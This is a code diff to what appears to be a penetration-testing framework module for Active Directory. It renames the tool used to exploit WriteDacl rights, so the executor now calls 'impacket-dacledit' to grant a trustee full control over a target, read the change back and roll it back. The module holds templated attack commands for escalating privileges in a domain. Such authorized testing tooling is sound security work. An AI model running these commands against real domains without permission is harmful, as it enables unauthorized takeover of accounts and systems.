@@ -5,17 +5,17 @@ WriteDacl/FullControl/GenericAll over a target writes a NEW ACE granting another
 (or the same) trustee FullControl/GenericAll, then PROVES it with a positive
 DACL read-back (never the write call's own exit code):
 
-    dacledit.py -action read  (confirm the PRECONDITION ACE)
-    dacledit.py -action write -ace-type grant -rights <rights> -principal <trustee>
-    dacledit.py -action read  (POSITIVE confirmation -- the terminal proof)
-    ROLLBACK: dacledit.py -action remove ... ; re-read (non-vacuous: bind-ok AND
+    impacket-dacledit -action read  (confirm the PRECONDITION ACE)
+    impacket-dacledit -action write -ace-type grant -rights <rights> -principal <trustee>
+    impacket-dacledit -action read  (POSITIVE confirmation -- the terminal proof)
+    ROLLBACK: impacket-dacledit -action remove ... ; re-read (non-vacuous: bind-ok AND
               trustee no longer shows <rights>)
 
 Non-destructive (not irreversible, not code-exec): no destructive-confirm gate.
 Mutating: yes (a new ACE is written), so a VERIFIED rollback is required.
 
 ``verified_recipe=False`` (recipe-known, not lab-proven, like ESC8/ESC11/
-Certifried). UNVERIFIED: the exact dacledit.py human-readable wording (see
+Certifried). UNVERIFIED: the exact impacket-dacledit human-readable wording (see
 ``acl_common.py``'s module docstring) -- if it differs, ``confirm_ace``
 degrades to ``unknown`` (attempt anyway), never a false negative.
 """
@@ -42,7 +42,7 @@ class WriteDaclExecutor(ValidationExecutor):
     verified_recipe = False
     pre = frozenset({states.S0_USER_CREDS})
     eff = frozenset({states.S_ACL_CONTROL})
-    recipe_ref = ("T3 WRITE-DACL = dacledit.py -action read (confirm precondition "
+    recipe_ref = ("T3 WRITE-DACL = impacket-dacledit -action read (confirm precondition "
                   "WriteDacl/FullControl/GenericAll) ; -action write -ace-type grant "
                   "-rights <rights> -principal <trustee> ; -action read (POSITIVE "
                   "readback = the terminal) ; ROLLBACK -action remove + read-back "
@@ -87,13 +87,13 @@ class WriteDaclExecutor(ValidationExecutor):
         v = values(params)
         dc = ctx.config.dc_ip
         return [
-            f"dacledit.py -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
             "(confirm precondition ACE)",
-            f"dacledit.py -action write -ace-type grant -rights {v['rights']} "
+            f"impacket-dacledit -action write -ace-type grant -rights {v['rights']} "
             f"-principal '{v['trustee']}' -target '{v['target']}' -dc-ip {dc} <auth>",
-            f"dacledit.py -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
             "(POSITIVE readback = the terminal proof)",
-            "ROLLBACK: dacledit.py -action remove ... + positive read-back",
+            "ROLLBACK: impacket-dacledit -action remove ... + positive read-back",
         ]
 
     # ---------------------------------------------------------------- execute
